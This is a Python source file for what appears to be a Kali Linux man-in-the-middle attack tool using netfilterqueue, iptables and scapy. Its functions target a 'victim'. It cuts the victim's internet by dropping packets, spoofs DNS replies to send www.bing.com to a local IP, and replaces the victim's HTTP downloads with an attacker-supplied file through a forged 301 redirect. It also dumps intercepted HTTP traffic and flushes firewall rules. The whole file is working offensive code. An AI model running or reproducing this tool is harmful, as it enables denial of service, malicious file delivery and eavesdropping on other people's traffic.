'''
Redirect request packet to queue by iptables builtin to kali linux
iptables -I name_of_place_where_chain_stay -j name_of_chain --queue-num any_number
example:
iptables -I FORWARD -j NFQUEUE --queue-num 0
where FORWARD  is the palace where queue stay
name of chain is NFQUEUE
queue name is 0 you can place any number
'''
import netfilterqueue
import random,time,sys
import scapy.all as scapy
import termcolor as termcolor
import argparse,subprocess

class Dns:
    #change heare for different attack 
    extension = ""
    location = ""
    #end change location
    queue = random.randint(0,2)
    @staticmethod
    def local_settings():
        try:
            subprocess.check_output("iptables --flush",shell=True)
            out_output=subprocess.check_output("iptables -I OUTPUT -j NFQUEUE --queue-num "+str(Dns.queue),shell=True)
            out_input=subprocess.check_output("iptables -I INPUT -j NFQUEUE --queue-num "+str(Dns.queue),shell=True)
            # print(out_forward)
            if out_output==b'' and out_input ==b'':
                termcolor.cprint("[+] Iptables rule enabled at output and input queue","green")
        except:
            termcolor.cprint("[-] Error in setting up the environment.","red")
            sys.exit()
    @staticmethod
    def foreign_settings():
        try:
            out_f=subprocess.check_output("sysctl net.ipv4.ip_forward=1",shell=True)
            if b"1" in out_f:
                termcolor.cprint("[+] Ip forward enabled","green")
        except:
            print("[-] Do Ip forward manually.","red")
        try:
            subprocess.check_output("iptables --flush",shell=True)
            out_forward=subprocess.check_output("iptables -I FORWARD -j NFQUEUE --queue-num "+str(Dns.queue),shell=True)
            # print(out_forward)
            if out_forward==b'':
                termcolor.cprint("[+] Iptables rule enabled at forward queue.","green")
        except:
            pass
    @staticmethod
    def restore_foreign_settings():
        try:
            reset_iptables=subprocess.check_output("iptables --flush",shell=True)
            if reset_iptables ==b'':
                termcolor.cprint("[-] Iptables rule is flushed.","green")
            ipv4_forward = subprocess.check_output("sysctl net.ipv4.ip_forward=0",shell=True)
            if b"0" in ipv4_forward:
                termcolor.cprint("[-] IP forward disabled","green")
        except:
            termcolor.cprint("Error occuring in reseting iptables rule","red")
    @staticmethod
    def restore_local_settings():
        try:
            reset_iptables=subprocess.check_output("iptables --flush",shell=True)
            if reset_iptables ==b'':
                termcolor.cprint("[-] Iptables rule is flushed.","green")
        except:
            termcolor.cprint("Error occuring in reseting iptables rule","red")
    @staticmethod
    def get_argument():
        parser = argparse.ArgumentParser()
        parser.add_argument("-nc" ,"--netcut", nargs="?", dest="netcut", help="Cut internet connection of the victim.",default=0)
        parser.add_argument("-fi" ,"--file-interceptor", nargs="?", dest="intercept", help="Intercept victim download",default=0)
        parser.add_argument("-l" ,"--local", nargs="?", dest="local", help="Type of sniffer local or foreign.",default=0)
        parser.add_argument("-loc" ,"--location",  nargs="?",dest="location", help="Location of file.",default=0)
        parser.add_argument("-e" ,"--extension",  nargs="?",dest="extension", help="extension of replaced file",default=0)
        parser.add_argument("-wp" ,"--watch-packet", nargs="?", dest="watch_packet", help="Show packet information.",default=0)

        # tell this child to parse argument
        options= parser.parse_args()
        # print("intercept:"+str(options.intercept))
        if  options.netcut and options.intercept and options.watch_packet and options.local and options.location:
            parser.error("Usages -nc for netcut the victim.\nUsages -fi -l local or foreign -loc location of file  for intercept the downloaded file of the victim.\nUsages -wp -l local or foreign for analysis the packet.")
        if options.extension and options.location:
            Dns.extension = bytes(options.extension,"utf-8")
            Dns.location = options.location
        return options

    @staticmethod
    def queues(process):
        queue = netfilterqueue.NetfilterQueue()  # creating netfilterqueue objects
        queue.bind(Dns.queue, process)  # bind systensm queue with python queue
        queue.run()
    count = 0
    @staticmethod
    def net_cut(packet):
        # print(packet)
        # drop packet
        # print("\rVictim net cuted time : " + str(Dns.count), end="")
        # Dns.count += 5
        # time.sleep(5)
        packet.drop()

    @staticmethod
    def modify_packet(packet):
        scapy_packet = scapy.IP(packet.get_payload())  # conveting packet into scapy packet
        if scapy_packet.haslayer(scapy.DNSRR):  # if packet  has dns response
            qname = scapy_packet[scapy.DNSQR].qname
            if qname == "www.bing.com":
                print("[+] Spoofing target")
                # creating scapy response packet
                answer = scapy.DNSRR(rrname=qname,
                                     rdata="192.168.1.20")  # rdate is the ip which we want to inject in the response of target
                scapy_packet[scapy.DNS].an = answer  # inject in the packet
                # modify number of packet response in the packet
                scapy_packet[scapy.DNS].ancount = 1
                # chksum,len field in IP and UDP layer  corrupt our packet so del those  field
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len
                # put modified packet in the actual packet
                packet.set_payload(str(scapy_packet))

            print(scapy_packet.show())
        packet.accept()
    @staticmethod
    def set_load(packet,load):
        packet[scapy.Raw].load=load
        # modifying previous packet related value
        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum
        return packet

    ack_list = []

    @staticmethod
    def file_interceptor(packet):
        scapy_packet = scapy.IP(packet.get_payload())  # conveting packet into scapy packet
        if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:  # if packet  has dns response #data store in raw layer
            if scapy_packet[scapy.TCP].dport == 80:

                if Dns.extension in scapy_packet[scapy.Raw].load:
                    termcolor.cprint("[+] "+ str(Dns.extension)+" Request", "blue")
                    Dns.ack_list.append(scapy_packet[scapy.TCP].ack)
                    print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in Dns.ack_list:
                    Dns.ack_list.remove(scapy_packet[scapy.TCP].seq)
                    termcolor.cprint("[+] Replacing file:", "green")
                    # print(scapy_packet.show())
                    modified_packet = Dns.set_load(scapy_packet,"HTTP/1.1 301 Moved Permanently\nLocation: "+Dns.location+"\n\n")

                    packet.set_payload(bytes(modified_packet))
        packet.accept()
    @staticmethod
    def monitor(packet):
        scapy_packet = scapy.IP(packet.get_payload())  # conveting packet into scapy packet
        if scapy.Raw in scapy_packet and scapy.TCP in scapy_packet:  # if packet  has dns response #data store in raw layer
            if scapy_packet[scapy.TCP].dport == 80:
                termcolor.cprint("[+] Request==>","green")
                print(scapy_packet.show())
            elif scapy_packet[scapy.TCP].sport == 80:
                termcolor.cprint("[+] response ==>","blue")
                print(scapy_packet.show())

        packet.accept()
